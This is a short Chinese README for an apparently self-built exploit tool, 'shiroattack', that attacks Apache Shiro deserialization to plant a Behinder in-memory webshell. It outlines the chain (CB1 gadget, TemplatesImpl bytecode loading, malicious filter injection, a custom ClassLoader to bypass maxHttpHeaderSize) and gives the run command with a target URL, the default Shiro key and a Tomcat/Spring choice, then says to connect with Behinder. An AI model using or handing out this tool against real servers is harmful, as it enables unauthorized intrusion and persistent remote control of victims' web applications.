



# 

就是看了别人的文章，调试了一下漏洞，变成了利用工具

(有个小问题，忘记说了，有那个对应的 serialVersionUID 我这边没有遍历，就是说我们要把pom 对应的依赖改成和目标环境一样的 )

- P牛给shiro无CC依赖的CB1链来进行注入内存马

- `TemplatesImpl`来动态加载字节码触发其逻辑，从而注入恶意filter

- 利用自定义ClassLoader的方式绕过maxHttpHeaderSize

  理论上存在漏洞都能写成

## 使用方法

```
java -jar xxx.jar url key type(spring/tomcat)
```

```
java -jar shiroattack-1.0-SNAPSHOT-jar-with-dependencies.jar http://localhost:8080/shirodemo_war/index.jsp kPH+bIxk5D2deZiIxcaaaA== tomcat
```

然后冰蝎直接连就行了



参考原文：

[利用shiro反序列化注入冰蝎内存马 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/10696)
